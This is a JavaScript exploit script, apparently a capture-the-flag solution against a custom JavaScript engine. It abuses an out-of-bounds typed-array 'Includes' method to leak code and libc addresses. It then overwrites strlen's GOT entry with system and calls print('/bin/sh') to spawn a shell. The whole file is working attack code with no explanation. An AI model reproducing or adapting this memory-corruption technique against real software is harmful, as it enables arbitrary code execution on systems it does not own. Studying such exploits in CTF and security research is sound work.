function pwn() {

  /* Helpers */
  var k_jsObjectSize = 0x70
  var fclose_got = 0x45e58
  var __libc_atoi = 0x18ea90
  var __libc_environ = 0x1ef2e0
  var __free_got = 0x4dde0
  var __je_free = 0x13b10

  var heapSpray = function(size, nums) {
    var s = []
    for(var i = 0; i < nums; i++) {
      var str = ""
      for(var j = 0; j < size; j++) {
        str += "A"
      }
      s.push(s)
    }
  }
  Number.prototype.hex = function() {
    return this.toString(16)
  }
  heapSpray(0x70, 0x20)
  gc(); gc();

  var ab = new ArrayBuffer(0x70)
  var uint16_t = new Uint16Array(ab)

  /* Leak Code */
  var dump = {}
  for(var j = 0; j < 0xffff; j++) {
    var k = uint16_t.Includes(j)
    if(k != undefined) {
      dump[k] = j
    }
  }

  __code_leak = parseInt("0x"+dump["62"].hex()+dump["61"].hex()+dump["60"].hex(),0)
  __code_base = __code_leak - 0x460a0 /* Sentinal */
  print('[*] Code @ 0x' + __code_base.hex())

  var uint16_t_2 = new Uint16Array(ab)

  uint16_t_2.set(72, (__code_leak&0xffff) - 0x248)
  uint16_t_2.set(73, (__code_leak>>16)&0xffff)
  uint16_t_2.set(74, dump["62"])

  uint16_t_2.set(76,3)

  var leak = {}
  for(var i = 0; i < 0xffff; i++) {
    var k = uint16_t.Includes(i)
    if(k != undefined) {
      leak[k] = i
    }
  }
  var __libc_leak = parseInt("0x"+leak["2"].hex()+leak["1"].hex()+leak["0"].hex())
  var __libc_base = __libc_leak - 0x84f50
  var __strlen_libc_got = __libc_base + 0x1eb0a8
  var __system = __libc_base + 0x55410

  print('[*] libc @ 0x'+__libc_base.hex())

  uint16_t_2.set(72, (__strlen_libc_got&0xffff))
  uint16_t_2.set(73, (__strlen_libc_got>>16)&0xffff)
  uint16_t_2.set(74, leak["2"])

  uint16_t.set(0, __system&0xffff)
  uint16_t.set(1, (__system>>16)&0xffff)
  uint16_t.set(2, leak["2"])

  print('/bin/sh')
  for(;;){}
}
pwn()